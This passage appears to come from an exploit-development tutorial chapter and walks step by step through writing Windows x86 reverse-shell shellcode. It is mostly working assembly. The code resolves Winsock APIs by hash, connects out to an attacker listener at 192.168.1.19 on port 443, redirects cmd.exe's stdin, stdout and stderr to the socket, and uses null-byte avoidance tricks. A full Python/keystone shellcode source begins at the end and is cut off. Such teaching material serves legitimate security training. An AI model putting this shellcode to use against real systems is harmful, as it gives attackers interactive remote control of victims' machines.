  <text x="180" y="72" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Stack String Construction</text>
  <text x="180" y="90" text-anchor="middle" fill="#e0e7ff" font-size="10">"ws2_" + "32.d" + "ll\0\0" + "\0\0\0\0"</text>
  <text x="180" y="108" text-anchor="middle" fill="#8b949e" font-size="10">ESP points to "ws2_32.dll\0"</text>
  <text x="180" y="122" text-anchor="middle" fill="#00d4ff" font-size="10">push esp -> pointer argument</text>
  <line x1="320" y1="90" x2="390" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s1002)"/>
  <rect x="395" y="50" width="310" height="80" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="550" y="72" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">LoadLibraryA("ws2_32.dll")</text>
  <text x="550" y="92" text-anchor="middle" fill="#e0e7ff" font-size="11">Returns: base address of ws2_32.dll</text>
  <text x="550" y="110" text-anchor="middle" fill="#e0e7ff" font-size="11">mov ebx, eax -> EBX = new DLL base</text>
  <text x="550" y="122" text-anchor="middle" fill="#8b949e" font-size="10">find_function now resolves from ws2_32</text>
</svg></div>

*Figure 10.2 -- Loading ws2_32.dll: the string is built on the stack, LoadLibraryA maps the DLL into memory, and the base address is stored in EBX for subsequent find_function calls.*

### Step 3: Resolving ws2_32.dll Functions

With `ws2_32.dll` loaded and its base in EBX, we resolve three Winsock functions:

**WSAStartup** `int WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)` Initializes the Winsock library. Must be called before any other Winsock function. Hash: `0x3bfcedcb`.

**WSASocketA** `SOCKET WSASocketA(int af, int type, int protocol, ...)` Creates a TCP socket. We use this instead of `socket()` because it gives us more control over flags. Hash: `0xadf509d9`.

**WSAConnect** `int WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, ...)` Connects the socket to the attacker's listener. Hash: `0xb32dba0c`.

```nasm
resolve_symbols_ws2_32:
    mov   ebx, eax                ; EBX = ws2_32.dll base
    push  0x3bfcedcb              ; WSAStartup hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x1C], eax         ; save WSAStartup

    push  0xadf509d9              ; WSASocketA hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x20], eax         ; save WSASocketA

    push  0xb32dba0c              ; WSAConnect hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x24], eax         ; save WSAConnect
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1003" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1003"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1003" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1003)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1003)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1003)" font-weight="bold">ws2_32.dll API Resolution</text>
  <rect x="50" y="50" width="200" height="120" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="150" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Table (ws2_32)</text>
  <rect x="65" y="82" width="170" height="24" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="150" y="98" text-anchor="middle" fill="#ff3366" font-size="10">[ebp+0x1C] = WSAStartup</text>
  <rect x="65" y="112" width="170" height="24" rx="4" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="150" y="128" text-anchor="middle" fill="#ff6b35" font-size="10">[ebp+0x20] = WSASocketA</text>
  <rect x="65" y="142" width="170" height="24" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="150" y="158" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x24] = WSAConnect</text>
  <rect x="310" y="50" width="400" height="120" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="510" y="72" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Winsock Call Sequence</text>
  <text x="510" y="95" text-anchor="middle" fill="#ff3366" font-size="11">1. WSAStartup(0x0202, &wsadata) -- init library</text>
  <text x="510" y="115" text-anchor="middle" fill="#ff6b35" font-size="11">2. WSASocketA(2, 1, 6, 0, 0, 0) -- create TCP socket</text>
  <text x="510" y="135" text-anchor="middle" fill="#00ff88" font-size="11">3. WSAConnect(sock, &addr, 16, ...) -- connect out</text>
  <text x="510" y="158" text-anchor="middle" fill="#8b949e" font-size="10">Each call must succeed before the next can proceed</text>
</svg></div>

*Figure 10.3 -- Three Winsock functions resolved from ws2_32.dll. They are called in strict order: initialize, create socket, connect.*

### Step 4: Calling WSAStartup

`WSAStartup` must be called before any other Winsock function. It takes a version number (`0x0202` for Winsock 2.2) and a pointer to a `WSADATA` structure (400 bytes) that receives information about the Windows Sockets implementation.

```nasm
call_wsastartup:
    mov   eax, esp                ; EAX = current stack pointer
    mov   cx, 0x590               ; CX = 0x590
    sub   eax, ecx                ; make room for WSADATA (avoid overwriting)
    push  eax                     ; push lpWSAData
    xor   eax, eax
    mov   ax, 0x0202              ; wVersionRequired = 2.2
    push  eax                     ; push wVersionRequired
    call  dword ptr [ebp+0x1C]    ; call WSAStartup
```

### Step 5: Calling WSASocketA

`WSASocketA` creates a TCP socket. The six parameters specify: address family (`AF_INET = 2`), socket type (`SOCK_STREAM = 1`), protocol (`IPPROTO_TCP = 6`), and three zeros for optional parameters.

```nasm
call_wsasocketa:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; dwFlags = 0
    push  eax                     ; g = 0
    push  eax                     ; lpProtocolInfo = NULL
    mov   al, 0x06                ; IPPROTO_TCP = 6
    push  eax                     ; push protocol
    sub   al, 0x05                ; AL = 1
    push  eax                     ; push type = SOCK_STREAM
    inc   eax                     ; EAX = 2
    push  eax                     ; push af = AF_INET
    call  dword ptr [ebp+0x20]    ; call WSASocketA
```

The returned socket descriptor is saved for use in WSAConnect, STARTUPINFOA, and CreateProcessA.

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1004" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1004"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1004" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1004" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1004)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1004)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1004)" font-weight="bold">WSASocketA Parameter Layout</text>
  <text x="80" y="60" fill="#00d4ff" font-size="11" font-weight="bold">Push Order (right to left):</text>
  <rect x="50" y="72" width="310" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="205" y="90" text-anchor="middle" fill="#8b949e" font-size="10">push 0 -- dwFlags = 0</text>
  <rect x="50" y="104" width="310" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="205" y="122" text-anchor="middle" fill="#8b949e" font-size="10">push 0 -- g = 0 | push 0 -- lpProtocolInfo = NULL</text>
  <rect x="50" y="136" width="310" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="205" y="154" text-anchor="middle" fill="#ff6b35" font-size="10">push 6 -- IPPROTO_TCP | push 1 -- SOCK_STREAM | push 2 -- AF_INET</text>
  <rect x="400" y="72" width="310" height="95" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="555" y="95" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">WSASocketA(2, 1, 6, 0, 0, 0)</text>
  <text x="555" y="118" text-anchor="middle" fill="#e0e7ff" font-size="11">Returns: SOCKET descriptor (integer)</text>
  <text x="555" y="138" text-anchor="middle" fill="#e0e7ff" font-size="11">Saved to ESI for later use</text>
  <text x="555" y="155" text-anchor="middle" fill="#8b949e" font-size="10">This handle becomes stdin/stdout/stderr</text>
  <text x="375" y="200" text-anchor="middle" fill="#8b949e" font-size="11">Note: values like 6 and 2 are built via mov al/sub al/inc to avoid null bytes in the opcodes</text>
</svg></div>

*Figure 10.4 -- WSASocketA creates a raw TCP socket. The returned handle will be used for the connection and as the stdio handles in STARTUPINFOA.*

### Step 6: Building sockaddr_in and Calling WSAConnect

The `sockaddr_in` structure tells `WSAConnect` where to connect. It has four fields:

| Field       | Value        | Meaning                    |
|:-----------:|:------------:|:--------------------------:|
| sin_family  | `0x0002`     | AF_INET (IPv4)             |
| sin_port    | `0xBB01`     | Port 443 (network order)   |
| sin_addr    | `0xC0A80113` | 192.168.1.19 (little-endian) |
| sin_zero    | `0x00000000` | Padding (8 bytes)          |

```nasm
call_wsaconnect:
    mov   esi, eax                ; ESI = socket descriptor
    xor   eax, eax
    push  eax                     ; sin_zero padding
    push  eax                     ; sin_zero padding
    push  0x1301a8c0              ; sin_addr = 192.168.1.19
    mov   ax, 0xbb01              ; port 443 in network byte order
    shl   eax, 0x10               ; shift to high word
    add   ax, 0x02                ; AF_INET = 2
    push  eax                     ; sin_port + sin_family
    push  esp                     ; pointer to sockaddr_in
    pop   edi                     ; EDI = &sockaddr_in
    xor   eax, eax
    push  eax                     ; lpGQOS = NULL
    push  eax                     ; lpSQOS = NULL
    push  eax                     ; lpCalleeData = NULL
    push  eax                     ; lpCallerData = NULL
    add   al, 0x10                ; namelen = 16
    push  eax                     ; push namelen
    push  edi                     ; push &sockaddr_in
    push  esi                     ; push socket
    call  dword ptr [ebp+0x24]    ; call WSAConnect
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1005" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1005"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1005" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1005)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1005)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1005)" font-weight="bold">sockaddr_in Memory Layout (16 bytes)</text>
  <text x="375" y="50" text-anchor="middle" fill="#8b949e" font-size="11">Pushed in reverse order so fields read correctly at ESP</text>
  <text x="110" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Offset</text>
  <text x="220" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Byte 0</text>
  <text x="310" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Byte 1</text>
  <text x="400" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Byte 2</text>
  <text x="490" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Byte 3</text>
  <text x="620" y="78" text-anchor="middle" fill="#8b949e" font-size="10">Field</text>
  <rect x="60" y="88" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="108" text-anchor="middle" fill="#00d4ff" font-size="11">+0x00</text>
  <rect x="170" y="88" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="108" text-anchor="middle" fill="#ff6b35" font-size="11">0x02</text>
  <rect x="260" y="88" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="300" y="108" text-anchor="middle" fill="#ff6b35" font-size="11">0x00</text>
  <rect x="350" y="88" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="390" y="108" text-anchor="middle" fill="#ff3366" font-size="11">0x01</text>
  <rect x="440" y="88" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="480" y="108" text-anchor="middle" fill="#ff3366" font-size="11">0xBB</text>
  <text x="620" y="100" text-anchor="middle" fill="#ff6b35" font-size="10">sin_family=AF_INET</text>
  <text x="620" y="114" text-anchor="middle" fill="#ff3366" font-size="10">sin_port=443</text>
  <rect x="60" y="126" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="146" text-anchor="middle" fill="#00d4ff" font-size="11">+0x04</text>
  <rect x="170" y="126" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="210" y="146" text-anchor="middle" fill="#00ff88" font-size="11">0xC0</text>
  <rect x="260" y="126" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="300" y="146" text-anchor="middle" fill="#00ff88" font-size="11">0xA8</text>
  <rect x="350" y="126" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="390" y="146" text-anchor="middle" fill="#00ff88" font-size="11">0x01</text>
  <rect x="440" y="126" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="480" y="146" text-anchor="middle" fill="#00ff88" font-size="11">0x13</text>
  <text x="620" y="146" text-anchor="middle" fill="#00ff88" font-size="10">192.168.1.19</text>
  <rect x="60" y="164" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="184" text-anchor="middle" fill="#00d4ff" font-size="11">+0x08</text>
  <rect x="170" y="164" width="350" height="32" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="345" y="184" text-anchor="middle" fill="#8b949e" font-size="11">0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</text>
  <text x="620" y="184" text-anchor="middle" fill="#8b949e" font-size="10">sin_zero (padding)</text>
  <rect x="80" y="215" width="590" height="48" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="375" y="234" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Null Byte Trick for sin_family + sin_port:</text>
  <text x="375" y="252" text-anchor="middle" fill="#e0e7ff" font-size="11">mov ax, 0xbb01 -> shl eax, 0x10 -> add ax, 0x02 = 0xBB010002 (no nulls!)</text>
</svg></div>

*Figure 10.5 -- sockaddr_in struct layout. The sin_port and sin_family are packed into one DWORD using shift and add to avoid null bytes.*

### Step 7: STARTUPINFOA -- Redirecting stdio to the Socket

This is the critical step that makes the reverse shell interactive. We build a `STARTUPINFOA` structure where `hStdInput`, `hStdOutput`, and `hStdError` all point to the socket handle, and `dwFlags` is set to `STARTF_USESTDHANDLES (0x100)`.

```nasm
create_startupinfoa:
    push  esi                     ; hStdError  = SOCKET
    push  esi                     ; hStdOutput = SOCKET
    push  esi                     ; hStdInput  = SOCKET
    xor   eax, eax
    push  eax                     ; lpReserved2 = NULL
    push  eax                     ; cbReserved2 + wShowWindow = 0
    mov   al, 0x80
    xor   ecx, ecx
    mov   cx, 0x80
    add   eax, ecx                ; EAX = 0x100 (STARTF_USESTDHANDLES)
    push  eax                     ; dwFlags
    xor   eax, eax
    push  eax                     ; dwFillAttribute = 0
    push  eax                     ; dwYCountChars = 0
    push  eax                     ; dwXCountChars = 0
    push  eax                     ; dwYSize = 0
    push  eax                     ; dwXSize = 0
    push  eax                     ; dwY = 0
    push  eax                     ; dwX = 0
    push  eax                     ; lpTitle = NULL
    push  eax                     ; lpDesktop = NULL
    push  eax                     ; lpReserved = NULL
    mov   al, 0x44                ; cb = sizeof(STARTUPINFOA) = 68 bytes
    push  eax                     ; cb
    push  esp                     ; pointer to STARTUPINFOA
    pop   edi                     ; EDI = &STARTUPINFOA
```

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1006" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1006"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1006" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1006" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="340" rx="10" fill="url(#bg_s1006)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1006)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1006)" font-weight="bold">STARTUPINFOA: stdio Redirect to Socket</text>
  <rect x="40" y="48" width="320" height="260" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="200" y="70" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">STARTUPINFOA (68 bytes)</text>
  <rect x="55" y="82" width="290" height="22" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="200" y="97" text-anchor="middle" fill="#8b949e" font-size="10">cb = 0x44 (68 bytes)</text>
  <rect x="55" y="108" width="290" height="22" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="200" y="123" text-anchor="middle" fill="#8b949e" font-size="10">lpReserved, lpDesktop, lpTitle = NULL</text>
  <rect x="55" y="134" width="290" height="22" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="200" y="149" text-anchor="middle" fill="#8b949e" font-size="10">dwX, dwY, dwXSize, dwYSize = 0</text>
  <rect x="55" y="160" width="290" height="22" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="200" y="175" text-anchor="middle" fill="#8b949e" font-size="10">dwXCountChars, dwYCountChars, dwFillAttr = 0</text>
  <rect x="55" y="186" width="290" height="28" rx="4" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="200" y="204" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">dwFlags = 0x100 (STARTF_USESTDHANDLES)</text>
  <rect x="55" y="220" width="290" height="28" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="200" y="238" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">hStdInput  = SOCKET handle</text>
  <rect x="55" y="252" width="290" height="28" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="200" y="270" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">hStdOutput = SOCKET handle</text>
  <rect x="55" y="284" width="290" height="28" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="200" y="302" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">hStdError  = SOCKET handle</text>
  <rect x="410" y="100" width="300" height="130" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="560" y="125" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Data Flow</text>
  <text x="560" y="148" text-anchor="middle" fill="#e0e7ff" font-size="11">Attacker types -> socket -> cmd stdin</text>
  <text x="560" y="168" text-anchor="middle" fill="#e0e7ff" font-size="11">cmd stdout -> socket -> attacker sees</text>
  <text x="560" y="188" text-anchor="middle" fill="#e0e7ff" font-size="11">cmd stderr -> socket -> attacker sees</text>
  <text x="560" y="212" text-anchor="middle" fill="#ff3366" font-size="10">All three handles = same socket!</text>
</svg></div>

*Figure 10.6 -- The STARTUPINFOA structure with all three stdio handles pointing to the socket. This is what makes the reverse shell bidirectional: the attacker's keystrokes flow through the socket into cmd.exe's stdin, and cmd.exe's output flows back.*

### Step 8: Spawning cmd.exe via CreateProcessA

Finally, we build `"cmd.exe"` on the stack and call `CreateProcessA` with `bInheritHandles = TRUE` (critical -- without it, the child process cannot inherit the socket handle) and our STARTUPINFOA structure:

```nasm
create_cmd_string:
    mov   eax, 0xff9a879b        ; NEG trick for null avoidance
    neg   eax                     ; EAX = 0x00657865 = "exe\0"
    push  eax
    push  0x2e646d63              ; "cmd."
    push  esp
    pop   ebx                     ; EBX = pointer to "cmd.exe"

call_createprocessa:
    mov   eax, esp
    xor   ecx, ecx
    mov   cx, 0x390
    sub   eax, ecx                ; lpProcessInformation (safe stack area)
    push  eax                     ; push lpProcessInformation
    push  edi                     ; push lpStartupInfo (our STARTUPINFOA)
    xor   eax, eax
    push  eax                     ; lpCurrentDirectory = NULL
    push  eax                     ; lpEnvironment = NULL
    push  eax                     ; dwCreationFlags = 0
    inc   eax                     ; EAX = 1 (TRUE)
    push  eax                     ; bInheritHandles = TRUE (CRITICAL!)
    dec   eax                     ; EAX = 0
    push  eax                     ; lpThreadAttributes = NULL
    push  eax                     ; lpProcessAttributes = NULL
    push  ebx                     ; lpCommandLine = "cmd.exe"
    push  eax                     ; lpApplicationName = NULL
    call  dword ptr [ebp+0x18]    ; call CreateProcessA
```

> `bInheritHandles = TRUE` is non-negotiable. Without it, the child process does not inherit the socket handle, and the stdio redirect silently fails.

### Complete Reverse Shell Flow

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1007" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1007"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1007" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1007" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1007)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1007)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1007)" font-weight="bold">Complete Reverse Shell Flow</text>
  <rect x="10" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="52" y="70" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve</text>
  <text x="52" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">kernel32</text>
  <line x1="95" y1="75" x2="108" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="110" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="152" y="70" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Load DLL</text>
  <text x="152" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">ws2_32.dll</text>
  <line x1="195" y1="75" x2="208" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="210" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="252" y="70" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve</text>
  <text x="252" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">ws2_32</text>
  <line x1="295" y1="75" x2="308" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="310" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="352" y="70" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WSAStartup</text>
  <text x="352" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">init winsock</text>
  <line x1="395" y1="75" x2="408" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="410" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="452" y="70" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WSASocketA</text>
  <text x="452" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">create TCP</text>
  <line x1="495" y1="75" x2="508" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="510" y="50" width="85" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="552" y="70" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WSAConnect</text>
  <text x="552" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">call home</text>
  <line x1="595" y1="75" x2="608" y2="75" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1007)"/>
  <rect x="610" y="50" width="120" height="50" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="670" y="70" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">CreateProcessA</text>
  <text x="670" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">cmd.exe + stdio</text>
  <rect x="50" y="120" width="650" height="80" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="142" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Reverse Shell Architecture</text>
  <text x="375" y="165" text-anchor="middle" fill="#e0e7ff" font-size="11">Target connects OUT to attacker -> socket becomes stdin/stdout/stderr</text>
  <text x="375" y="185" text-anchor="middle" fill="#8b949e" font-size="11">Attacker types commands -> socket -> cmd.exe -> socket -> attacker sees output</text>
</svg></div>

*Figure 10.7 -- The complete reverse shell pipeline from kernel32.dll resolution through to the interactive shell. Eight distinct operations in roughly 350 bytes of machine code.*

### Full Shellcode Source (`reverse.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   int3                            ;"  #   Breakpoint for Windbg
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
